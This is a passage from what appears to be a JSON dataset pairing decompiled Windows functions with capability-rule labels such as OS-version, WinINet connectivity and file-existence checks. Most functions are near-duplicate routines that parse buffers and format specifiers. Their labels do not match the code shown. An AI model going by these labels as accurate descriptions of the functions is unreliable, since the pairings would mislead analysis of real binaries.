        "decompiled_code": "\nuint __cdecl fcn.0043fa21(ushort *arg_8h)\n\n{\n    ushort *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t in_EAX;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 2;\n        *arg_8h = *puVar1;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.004540cd(in_ECX + 0x464 + uVar2 * 0x10, 1, in_EAX & 0xffffff00 | *(in_ECX + 0x2d), \n                                 *(in_ECX + 0x28));\n            return uVar4;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar2 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 365
    },
    "0043fab3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043fab3(ushort *arg_8h)\n\n{\n    ushort *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t in_EAX;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 2;\n        *arg_8h = *puVar1;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.0045412f(in_ECX + 0x464 + uVar2 * 0x10, 1, in_EAX & 0xffffff00 | *(in_ECX + 0x2d), \n                                 *(in_ECX + 0x28));\n            return uVar4;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar2 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 366
    },
    "0043fb45": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043fb45(ushort *arg_8h)\n\n{\n    ushort *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 2;\n        *arg_8h = *puVar1;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.00454191(in_ECX + 0x464 + uVar2 * 0x10, 1, *(in_ECX + 0x2e), *(in_ECX + 0x28));\n            return uVar4;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar2 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 346
    },
    "0043fbd8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043fbd8(ushort *arg_8h)\n\n{\n    ushort *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 2;\n        *arg_8h = *puVar1;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.004541f5(in_ECX + 0x464 + uVar2 * 0x10, 1, *(in_ECX + 0x2e), *(in_ECX + 0x28));\n            return uVar4;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar2 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 348
    },
    "00446afe": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00446afe(int32_t **arg_8h, uint arg_ch, int32_t arg_10h, int32_t *arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    if (0 < arg_10h) {\n        iVar2 = *arg_14h;\n        do {\n            piVar1 = *arg_8h;\n            if (piVar1[2] == piVar1[1]) {\n                if (*(piVar1 + 3) == '\\0') {\n                    iVar2 = -1;\n                }\n                else {\n                    iVar2 = iVar2 + 1;\n                }\n                *arg_14h = iVar2;\n            }\n            else {\n                *arg_14h = iVar2 + 1;\n                (*arg_8h)[2] = (*arg_8h)[2] + 1;\n                ***arg_8h = arg_ch;\n                **arg_8h = **arg_8h + 1;\n            }\n            iVar2 = *arg_14h;\n        } while ((iVar2 != -1) && (iVar3 = iVar3 + 1,  iVar3 < arg_10h));\n    }\n    return;\n}\n",
        "token_count": 287
    },
    "00446b61": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00446b61(int32_t **arg_8h, uint arg_ch, int32_t arg_10h, int32_t *arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    if (0 < arg_10h) {\n        iVar2 = *arg_14h;\n        do {\n            piVar1 = *arg_8h;\n            if (piVar1[2] == piVar1[1]) {\n                if (*(piVar1 + 3) == '\\0') {\n                    iVar2 = -1;\n                }\n                else {\n                    iVar2 = iVar2 + 1;\n                }\n                *arg_14h = iVar2;\n            }\n            else {\n                *arg_14h = iVar2 + 1;\n                (*arg_8h)[2] = (*arg_8h)[2] + 1;\n                ***arg_8h = arg_ch;\n                **arg_8h = **arg_8h + 2;\n            }\n            iVar2 = *arg_14h;\n        } while ((iVar2 != -1) && (iVar3 = iVar3 + 1,  iVar3 < arg_10h));\n    }\n    return;\n}\n",
        "token_count": 288
    },
    "0044797f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0044797f(int32_t param_1)\n\n{\n    int32_t iVar1;\n    unkuint3 Var2;\n    \n    iVar1 = *(param_1 + 0x458);\n    *(param_1 + 0x458) = iVar1 + 1;\n    Var2 = iVar1 + 1 >> 8;\n    if ((iVar1 != 2) && ((iVar1 != 1 || (*(param_1 + 0x45c) != 1)))) {\n        *(param_1 + 0xaa4) = 0xffffffff;\n        *(param_1 + 0xaa8) = 0xffffffff;\n        *(param_1 + 0x45c) = 0;\n        *(param_1 + 0x20) = 0;\n        *(param_1 + 0x24) = 0;\n        *(param_1 + 0xc) = *(param_1 + 0x460);\n        return CONCAT31(Var2, 1);\n    }\n    return Var2 << 8;\n}\n",
        "token_count": 235
    },
    "004479cd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004479cd(int32_t param_1)\n\n{\n    int32_t iVar1;\n    unkuint3 Var2;\n    \n    iVar1 = *(param_1 + 0x458);\n    *(param_1 + 0x458) = iVar1 + 1;\n    Var2 = iVar1 + 1 >> 8;\n    if ((iVar1 != 2) && ((iVar1 != 1 || (*(param_1 + 0x45c) != 1)))) {\n        *(param_1 + 0xaa4) = 0xffffffff;\n        *(param_1 + 0xaa8) = 0xffffffff;\n        *(param_1 + 0x45c) = 0;\n        *(param_1 + 0x20) = 0;\n        *(param_1 + 0x24) = 0;\n        *(param_1 + 0xc) = *(param_1 + 0x460);\n        return CONCAT31(Var2, 1);\n    }\n    return Var2 << 8;\n}\n",
        "token_count": 234
    },
    "00447a1b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00447a1b(int32_t param_1)\n\n{\n    int32_t iVar1;\n    unkuint3 Var2;\n    \n    iVar1 = *(param_1 + 0x458);\n    *(param_1 + 0x458) = iVar1 + 1;\n    Var2 = iVar1 + 1 >> 8;\n    if ((iVar1 != 2) && ((iVar1 != 1 || (*(param_1 + 0x45c) != 1)))) {\n        *(param_1 + 0xaa4) = 0xffffffff;\n        *(param_1 + 0xaa8) = 0xffffffff;\n        *(param_1 + 0x45c) = 0;\n        *(param_1 + 0x20) = 0;\n        *(param_1 + 0x24) = 0;\n        *(param_1 + 0xc) = *(param_1 + 0x460);\n        return CONCAT31(Var2, 1);\n    }\n    return Var2 << 8;\n}\n",
        "token_count": 236
    },
    "00447a69": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00447a69(int32_t param_1)\n\n{\n    int32_t iVar1;\n    unkuint3 Var2;\n    \n    iVar1 = *(param_1 + 0x458);\n    *(param_1 + 0x458) = iVar1 + 1;\n    Var2 = iVar1 + 1 >> 8;\n    if ((iVar1 != 2) && ((iVar1 != 1 || (*(param_1 + 0x45c) != 1)))) {\n        *(param_1 + 0xaa4) = 0xffffffff;\n        *(param_1 + 0xaa8) = 0xffffffff;\n        *(param_1 + 0x45c) = 0;\n        *(param_1 + 0x20) = 0;\n        *(param_1 + 0x24) = 0;\n        *(param_1 + 0xc) = *(param_1 + 0x460);\n        return CONCAT31(Var2, 1);\n    }\n    return Var2 << 8;\n}\n",
        "token_count": 235
    },
    "00447afb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00447afb(uint32_t arg_8h)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t *in_ECX;\n    \n    if ((*(in_ECX + 1) == '\\0') || (in_EAX = *in_ECX,  in_EAX != arg_8h)) {\n        uVar1 = in_EAX & 0xffffff00;\n    }\n    else {\n        uVar1 = CONCAT31(in_EAX >> 8, 1);\n    }\n    return uVar1;\n}\n",
        "token_count": 129
    },
    "0044805d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nbool __cdecl fcn.0044805d(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    char cVar3;\n    uint32_t in_EAX;\n    uint32_t arg_10h_00;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_ECX;\n    char cVar6;\n    char cVar7;\n    uint var_1h;\n    \n    uVar1 = *(arg_8h + 1);\n    arg_10h_00 = in_EAX & 0xffffff00 | uVar1;\n    cVar2 = arg_10h;\n    if ((uVar1 == 0x70) || (cVar2 == 'p')) {\n        return (uVar1 == 0x70) != (cVar2 != 'p');\n    }\n    cVar3 = '\\0';\n    if ((uVar1 == 0x73) || (var_1h._0_1_ = '\\0',  uVar1 == 0x53)) {\n        var_1h._0_1_ = '\\x01';\n    }\n    if ((cVar2 == 's') || (cVar7 = cVar3,  cVar2 == 'S')) {\n        cVar7 = '\\x01';\n    }\n    if ((uVar1 == 99) || (cVar6 = cVar3,  uVar1 == 0x43)) {\n        cVar6 = '\\x01';\n    }\n    if ((cVar2 == 'c') || (cVar2 == 'C')) {\n        cVar3 = '\\x01';\n    }\n    if (var_1h == '\\0') {\n        if (cVar7 != '\\0') {\n            return false;\n        }\n        if (cVar6 == '\\0') {\n            if (cVar3 != '\\0') {\n                return false;\n            }\n            cVar2 = fcn.0043fd75(arg_10h_00);\n            cVar3 = fcn.0043fd75(arg_10h);\n            if (cVar2 == '\\0') {\n                if (cVar3 != '\\0') {\n                    return false;\n                }\n                return *arg_8h == arg_ch;\n            }\n            if (cVar2 != cVar3) {\n                return false;\n            }\n            if ((arg_8h[3] == 9) != (arg_14h == 9)) {\n                return false;\n            }\n            iVar4 = fcn.0045027c(arg_8h[3]);\n            iVar5 = fcn.0045027c(arg_14h);\n            return iVar4 == iVar5;\n        }\n    }\n    else if (var_1h != cVar7) {\n        return false;\n    }\n    if (cVar6 == cVar3) {\n        cVar2 = fcn.0043ff17(*in_ECX, in_ECX[1], arg_10h_00, arg_8h[3]);\n        cVar3 = fcn.0043ff17(*in_ECX, in_ECX[1], arg_10h, arg_14h);\n        if (cVar2 == cVar3) {\n            return true;\n        }\n    }\n    return false;\n}\n",
        "token_count": 769
    },
    "00448177": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nbool __cdecl fcn.00448177(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    char cVar3;\n    uint32_t in_EAX;\n    uint32_t arg_10h_00;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_ECX;\n    char cVar6;\n    char cVar7;\n    uint var_1h;\n    \n    uVar1 = *(arg_8h + 1);\n    arg_10h_00 = in_EAX & 0xffffff00 | uVar1;\n    cVar2 = arg_10h;\n    if ((uVar1 == 0x70) || (cVar2 == 'p')) {\n        return (uVar1 == 0x70) != (cVar2 != 'p');\n    }\n    cVar3 = '\\0';\n    if ((uVar1 == 0x73) || (var_1h._0_1_ = '\\0',  uVar1 == 0x53)) {\n        var_1h._0_1_ = '\\x01';\n    }\n    if ((cVar2 == 's') || (cVar7 = cVar3,  cVar2 == 'S')) {\n        cVar7 = '\\x01';\n    }\n    if ((uVar1 == 99) || (cVar6 = cVar3,  uVar1 == 0x43)) {\n        cVar6 = '\\x01';\n    }\n    if ((cVar2 == 'c') || (cVar2 == 'C')) {\n        cVar3 = '\\x01';\n    }\n    if (var_1h == '\\0') {\n        if (cVar7 != '\\0') {\n            return false;\n        }\n        if (cVar6 == '\\0') {\n            if (cVar3 != '\\0') {\n                return false;\n            }\n            cVar2 = fcn.0043fda1(arg_10h_00);\n            cVar3 = fcn.0043fda1(arg_10h);\n            if (cVar2 == '\\0') {\n                if (cVar3 != '\\0') {\n                    return false;\n                }\n                return *arg_8h == arg_ch;\n            }\n            if (cVar2 != cVar3) {\n                return false;\n            }\n            if ((arg_8h[3] == 9) != (arg_14h == 9)) {\n                return false;\n            }\n            iVar4 = fcn.0045027c(arg_8h[3]);\n            iVar5 = fcn.0045027c(arg_14h);\n            return iVar4 == iVar5;\n        }\n    }\n    else if (var_1h != cVar7) {\n        return false;\n    }\n    if (cVar6 == cVar3) {\n        cVar2 = fcn.0043ff17(*in_ECX, in_ECX[1], arg_10h_00, arg_8h[3]);\n        cVar3 = fcn.0043ff17(*in_ECX, in_ECX[1], arg_10h, arg_14h);\n        if (cVar2 == cVar3) {\n            return true;\n        }\n    }\n    return false;\n}\n",
        "token_count": 770
    },
    "00448729": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00448729(uint *arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar4 = 1;\n    arg_8h_00 = *(in_ECX + 8);\n    var_4h = *(in_ECX + 0xc) - 1;\n    uVar1 = *(arg_8h_00 + 0x18);\n    uVar2 = *(arg_8h_00 + 0x1c);\n    uVar3 = fcn.0043ffcc(arg_8h_00, var_4h, &var_4h, 10, 1);\n    *arg_8h = uVar3;\n    if (((*(*(in_ECX + 8) + 0x1c) == '\\0') || (*(*(in_ECX + 8) + 0x18) != 0x22)) && (*(in_ECX + 0xc) <= var_4h)) {\n        *(in_ECX + 0xc) = var_4h;\n    }\n    else {\n        uVar4 = 0;\n    }\n    *(arg_8h_00 + 0x18) = uVar1;\n    *(arg_8h_00 + 0x1c) = uVar2;\n    return uVar2 & 0xffffff00 | uVar4;\n}\n",
        "token_count": 364
    },
    "004487a1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004487a1(uint *arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar4 = 1;\n    arg_8h_00 = *(in_ECX + 8);\n    var_4h = *(in_ECX + 0xc) - 1;\n    uVar1 = *(arg_8h_00 + 0x18);\n    uVar2 = *(arg_8h_00 + 0x1c);\n    uVar3 = fcn.0043ffcc(arg_8h_00, var_4h, &var_4h, 10, 1);\n    *arg_8h = uVar3;\n    if (((*(*(in_ECX + 8) + 0x1c) == '\\0') || (*(*(in_ECX + 8) + 0x18) != 0x22)) && (*(in_ECX + 0xc) <= var_4h)) {\n        *(in_ECX + 0xc) = var_4h;\n    }\n    else {\n        uVar4 = 0;\n    }\n    *(arg_8h_00 + 0x18) = uVar1;\n    *(arg_8h_00 + 0x1c) = uVar2;\n    return uVar2 & 0xffffff00 | uVar4;\n}\n",
        "token_count": 365
    },
    "00448819": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00448819(uint *arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar4 = 1;\n    arg_8h_00 = *(in_ECX + 8);\n    var_4h = *(in_ECX + 0xc) - 1;\n    uVar1 = *(arg_8h_00 + 0x18);\n    uVar2 = *(arg_8h_00 + 0x1c);\n    uVar3 = fcn.0043ffcc(arg_8h_00, var_4h, &var_4h, 10, 1);\n    *arg_8h = uVar3;\n    if (((*(*(in_ECX + 8) + 0x1c) == '\\0') || (*(*(in_ECX + 8) + 0x18) != 0x22)) && (*(in_ECX + 0xc) <= var_4h)) {\n        *(in_ECX + 0xc) = var_4h;\n    }\n    else {\n        uVar4 = 0;\n    }\n    *(arg_8h_00 + 0x18) = uVar1;\n    *(arg_8h_00 + 0x1c) = uVar2;\n    return uVar2 & 0xffffff00 | uVar4;\n}\n",
        "token_count": 364
    },
    "00448891": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00448891(uint *arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar4 = 1;\n    arg_8h_00 = *(in_ECX + 8);\n    var_4h = *(in_ECX + 0xc) - 1;\n    uVar1 = *(arg_8h_00 + 0x18);\n    uVar2 = *(arg_8h_00 + 0x1c);\n    uVar3 = fcn.0043ffcc(arg_8h_00, var_4h, &var_4h, 10, 1);\n    *arg_8h = uVar3;\n    if (((*(*(in_ECX + 8) + 0x1c) == '\\0') || (*(*(in_ECX + 8) + 0x18) != 0x22)) && (*(in_ECX + 0xc) <= var_4h)) {\n        *(in_ECX + 0xc) = var_4h;\n    }\n    else {\n        uVar4 = 0;\n    }\n    *(arg_8h_00 + 0x18) = uVar1;\n    *(arg_8h_00 + 0x1c) = uVar2;\n    return uVar2 & 0xffffff00 | uVar4;\n}\n",
        "token_count": 364
    },
    "00448909": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00448909(uint *arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar4 = 1;\n    arg_8h_00 = *(in_ECX + 8);\n    var_4h = *(in_ECX + 0xc) - 1;\n    uVar1 = *(arg_8h_00 + 0x18);\n    uVar2 = *(arg_8h_00 + 0x1c);\n    uVar3 = fcn.0043ffcc(arg_8h_00, var_4h, &var_4h, 10, 1);\n    *arg_8h = uVar3;\n    if (((*(*(in_ECX + 8) + 0x1c) == '\\0') || (*(*(in_ECX + 8) + 0x18) != 0x22)) && (*(in_ECX + 0xc) <= var_4h)) {\n        *(in_ECX + 0xc) = var_4h;\n    }\n    else {\n        uVar4 = 0;\n    }\n    *(arg_8h_00 + 0x18) = uVar1;\n    *(arg_8h_00 + 0x1c) = uVar2;\n    return uVar2 & 0xffffff00 | uVar4;\n}\n",
        "token_count": 364
    },
    "00448981": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00448981(uint *arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar4 = 1;\n    arg_8h_00 = *(in_ECX + 8);\n    var_4h = *(in_ECX + 0xc) - 1;\n    uVar1 = *(arg_8h_00 + 0x18);\n    uVar2 = *(arg_8h_00 + 0x1c);\n    uVar3 = fcn.0043ffcc(arg_8h_00, var_4h, &var_4h, 10, 1);\n    *arg_8h = uVar3;\n    if (((*(*(in_ECX + 8) + 0x1c) == '\\0') || (*(*(in_ECX + 8) + 0x18) != 0x22)) && (*(in_ECX + 0xc) <= var_4h)) {\n        *(in_ECX + 0xc) = var_4h;\n    }\n    else {\n        uVar4 = 0;\n    }\n    *(arg_8h_00 + 0x18) = uVar1;\n    *(arg_8h_00 + 0x1c) = uVar2;\n    return uVar2 & 0xffffff00 | uVar4;\n}\n",
        "token_count": 364
    },
    "004489f9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004489f9(uint *arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar4 = 1;\n    arg_8h_00 = *(in_ECX + 8);\n    var_4h = *(in_ECX + 0xc) - 2;\n    uVar1 = *(arg_8h_00 + 0x18);\n    uVar2 = *(arg_8h_00 + 0x1c);\n    uVar3 = fcn.004401db(arg_8h_00, var_4h, &var_4h, 10, 1);\n    *arg_8h = uVar3;\n    if (((*(*(in_ECX + 8) + 0x1c) == '\\0') || (*(*(in_ECX + 8) + 0x18) != 0x22)) && (*(in_ECX + 0xc) <= var_4h)) {\n        *(in_ECX + 0xc) = var_4h;\n    }\n    else {\n        uVar4 = 0;\n    }\n    *(arg_8h_00 + 0x18) = uVar1;\n    *(arg_8h_00 + 0x1c) = uVar2;\n    return uVar2 & 0xffffff00 | uVar4;\n}\n",
        "token_count": 364
    },
    "00448a73": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00448a73(uint *arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar4 = 1;\n    arg_8h_00 = *(in_ECX + 8);\n    var_4h = *(in_ECX + 0xc) - 2;\n    uVar1 = *(arg_8h_00 + 0x18);\n    uVar2 = *(arg_8h_00 + 0x1c);\n    uVar3 = fcn.004401db(arg_8h_00, var_4h, &var_4h, 10, 1);\n    *arg_8h = uVar3;\n    if (((*(*(in_ECX + 8) + 0x1c) == '\\0') || (*(*(in_ECX + 8) + 0x18) != 0x22)) && (*(in_ECX + 0xc) <= var_4h)) {\n        *(in_ECX + 0xc) = var_4h;\n    }\n    else {\n        uVar4 = 0;\n    }\n    *(arg_8h_00 + 0x18) = uVar1;\n    *(arg_8h_00 + 0x1c) = uVar2;\n    return uVar2 & 0xffffff00 | uVar4;\n}\n",
        "token_count": 364
    },
    "00448aed": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
